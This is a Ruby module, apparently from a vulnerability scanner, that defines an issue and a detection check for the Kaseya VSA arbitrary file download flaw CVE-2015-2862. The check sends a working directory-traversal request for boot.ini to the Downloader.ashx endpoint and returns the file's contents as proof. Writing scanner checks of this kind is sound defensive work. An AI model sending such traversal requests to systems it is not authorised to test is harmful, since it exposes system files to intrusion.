
module Intrigue

  module Issue
    class KaseyaCve20152862 < BaseIssue
      def self.generate(instance_details={})
      {
        added: "2021-07-08",
        name: "kaseya_cve_2015_2862",
        pretty_name: "Kaseya Arbitrary File Download (CVE-2015-2862)",
        identifiers: [
          { type: "CVE", name: "CVE-2015-2862" }
        ],
        severity: 1,
        category: "vulnerability",
        status: "confirmed",
        description: "A directory traversal vulnerability in Kaseya Virtual System Administrator (VSA) 7.x before 7.0.0.29, 8.x before 8.0.0.18, 9.0 before 9.0.0.14, and 9.1 before 9.1.0.4 allows remote authenticated users to read arbitrary files via a crafted HTTP request.",
        affected_software: [ 
          { :vendor => "Kaseya", :product => "Virtual System Administrator" }
        ],
        references: [
          { type: "description", uri: "https://nvd.nist.gov/vuln/detail/CVE-2015-2862" },
          { type: "exploit", uri: "https://www.exploit-db.com/exploits/37621" }
        ],
        authors: ["Pedro Ribeiro", "shpendk"]
      }.merge!(instance_details)
      end
    end
  end

  module Task
    class KaseyaCve20152862 < BaseCheck 
    def self.check_metadata
      {
        allowed_types: ["Uri"]
      }
    end

    # return truthy value to create an issue
    def check

      # get enriched entity
      require_enrichment
      uri = _get_entity_name
      headers = {
        Referer: "#{uri}"
      }

      # check if vuln
      response = http_request :get, "#{uri}?displayName=whatever&filepath=../../boot.ini", nil, headers
      if  response.code.to_i == 200 && response.body_utf8 =~ /operating systems/
          _log "Vulnerable!"
          return "Retrieved contents of boot.ini file: #{response.body_utf8}"
      end

      # if original URI didn't work, lets try the default url
      _log "Testing at /vsaPres/web20/core/Downloader.ashx"
      uri_obj = URI(uri)
      endpoint = "#{uri_obj.scheme}://#{uri_obj.hostname}:#{uri_obj.port}/vsaPres/web20/core/Downloader.ashx?displayName=whatever&filepath=../../boot.ini"
      response = http_request :get, endpoint, nil, headers
      if  response.code.to_i == 200 && response.body_utf8 =~ /operating systems/
          _log "Vulnerable!"
          return "Retrieved contents of boot.ini file: #{response.body_utf8}"
      end
    end

    end
  end
  
  end
